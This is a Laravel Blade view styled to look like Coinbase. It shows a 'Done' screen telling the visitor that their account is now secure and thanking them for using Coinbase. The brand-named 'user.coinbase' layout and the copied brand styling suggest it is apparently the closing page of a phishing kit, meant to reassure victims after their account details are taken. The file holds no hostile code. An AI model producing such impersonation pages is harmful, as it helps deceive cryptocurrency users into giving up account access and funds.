@extends('user.coinbase.layout')

@section('title', 'Coinbase - Done')

@section('pageCss')
*,
:before,
:after {
  box-sizing: border-box;
  border-width: 0;
  border-style: solid;
  border-color: #e5e7eb;
}

html,
:host {
  line-height: 1.5;
  -webkit-text-size-adjust: 100%;
  -moz-tab-size: 4;
  -o-tab-size: 4;
  tab-size: 4;
  font-family: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
  font-feature-settings: normal;
  font-variation-settings: normal;
  -webkit-tap-highlight-color: transparent;
}

body {
  margin: 0;
  line-height: inherit;
}

img,
svg,
video,
canvas,
audio,
iframe,
embed,
object {
  display: block;
  vertical-align: middle;
}

#root {
  height: 100%;
}

.bg-coinbase-background {
  --tw-bg-opacity: 1;
  background-color: rgb(10 11 13 / var(--tw-bg-opacity, 1));
}

.flex { display: flex; }
.flex-col { flex-direction: column; }
.flex-grow { flex-grow: 1; }
.font-coinbase-sans { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-coinbase-text { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-coinbase-title { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-semibold { font-weight: 600; }
.h-16 { height: 4rem; }
.h-full { height: 100%; }
.items-center { align-items: center; }
.justify-between { justify-content: space-between; }
.justify-center { justify-content: center; }
.max-w-md { max-width: 28rem; }
.mb-8 { margin-bottom: 2rem; }
.min-h-fit { min-height: -moz-fit-content; min-height: fit-content; }
.mt-4 { margin-top: 1rem; }
.mt-12 { margin-top: 3rem; }
.p-6 { padding: 1.5rem; }
.pb-2 { padding-bottom: .5rem; }
.pb-8 { padding-bottom: 2rem; }
.pt-5 { padding-top: 1.25rem; }
.px-6 { padding-left: 1.5rem; padding-right: 1.5rem; }
.rounded-\[16px\] { border-radius: 16px; }
.text-\[28px\] { font-size: 28px; }
.text-center { text-align: center; }
.text-coinbase-foreground-muted {
  --tw-text-opacity: 1;
  color: rgb(138 145 158 / var(--tw-text-opacity, 1));
}
.text-green-500 {
  --tw-text-opacity: 1;
  color: rgb(34 197 94 / var(--tw-text-opacity, 1));
}
.text-white {
  --tw-text-opacity: 1;
  color: rgb(255 255 255 / var(--tw-text-opacity, 1));
}
.w-16 { width: 4rem; }
.w-full { width: 100%; }
.fill-none { fill: none; }
.stroke-white { stroke: #fff; }
.stroke-\[30\] { stroke-width: 30; }

@media (min-width: 640px) {
  .sm\:border { border-width: 1px; }
  .sm\:border-coinbase-line,
  .sm\:border-crypto-line { border-color: #8a919e33; }
  .sm\:justify-start { justify-content: flex-start; }
  .sm\:mt-24 { margin-top: 6rem; }
  .sm\:px-10 { padding-left: 2.5rem; padding-right: 2.5rem; }
  .sm\:py-8 { padding-top: 2rem; padding-bottom: 2rem; }
}
@endsection

@section('content')
<form class="mt-12 flex min-h-fit w-full max-w-md flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8 items-center text-center">
{!! $checkmarkSvg !!}
<span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white">
Your account is now secure
</span>
<span class="font-coinbase-sans text-coinbase-foreground-muted">
You can now close this window and continue using your account.
<br/>
<br/>
Thank you for using Coinbase
</span>
</form>
@endsection
